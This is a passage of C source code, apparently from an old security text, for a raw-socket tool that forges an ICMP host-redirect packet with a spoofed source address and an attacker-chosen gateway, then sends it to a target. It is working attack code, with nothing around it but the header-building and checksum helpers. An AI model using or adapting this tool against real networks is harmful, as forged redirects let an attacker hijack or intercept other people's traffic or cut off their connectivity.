if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
        perror("socket");
        exit(1);
        }

sa.sin_addr.s_addr = get_ip_addr(argv[2]);
sa.sin_family = AF_INET;

packet_len = sizeof(struct raw_pkt);
pkt = calloc((size_t)1,(size_t)packet_len);

pkt->ip.version = IPVERSION;
pkt->ip.ihl = sizeof(struct iphdr) >> 2;
pkt->ip.tos = 0;
pkt->ip.tot_len = htons(packet_len);
pkt->ip.id = htons(getpid() & 0xFFFF);
pkt->ip.frag_off = 0;
pkt->ip.ttl = 0x40;
pkt->ip.protocol = IPPROTO_ICMP;
pkt->ip.check = 0;
pkt->ip.saddr = get_ip_addr(argv[1]);
pkt->ip.daddr = sa.sin_addr.s_addr;
pkt->ip.check = checksum((unsigned short*)pkt,sizeof(struct iphdr));

pkt->icmp.type = ICMP_REDIRECT;
pkt->icmp.code = ICMP_REDIR_HOST;
pkt->icmp.checksum = 0;
pkt->icmp.un.gateway = get_ip_addr(argv[4]);

memcpy(&(pkt->encl_iphdr),pkt,sizeof(struct iphdr));
pkt->encl_iphdr.protocol = IPPROTO_IP;
pkt->encl_iphdr.saddr = get_ip_addr(argv[2]);
pkt->encl_iphdr.daddr = get_ip_addr(argv[3]);
pkt->encl_iphdr.check = 0;
pkt->encl_iphdr.check = checksum((unsigned short*)&(pkt->encl_iphdr),
        sizeof(struct iphdr));

pkt->icmp.checksum = checksum((unsigned short*)&(pkt->icmp),
        sizeof(struct raw_pkt)-sizeof(struct iphdr));

if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0) {
        perror("setsockopt: IP_HDRINCL");
        exit(1);
        }

if(sendto(sock,pkt,packet_len,0,(struct sockaddr*)&sa,sizeof(sa)) < 0){
        perror("sendto");
        exit(1);
        }
exit(0);
}

void die(char* str){
fprintf(stderr,"%s\n",str);
exit(1);
}

unsigned long int get_ip_addr(char* str){

struct hostent *hostp;
unsigned long int addr;

if( (addr = inet_addr(str)) == -1){
        if( (hostp = gethostbyname(str)))
                return *(unsigned long int*)(hostp->h_addr);
        else {
                fprintf(stderr,"unknown host %s\n",str);
                exit(1);
                }
        }
return addr;
}

unsigned short checksum(unsigned short* addr,char len){
register long sum = 0;

while(len > 1){
        sum += *addr++;
        len -= 2;
        }
if(len > 0) sum += *addr;
while (sum>>16) sum = (sum & 0xffff) + (sum >> 16);

return ~sum;
}
==========================================================================
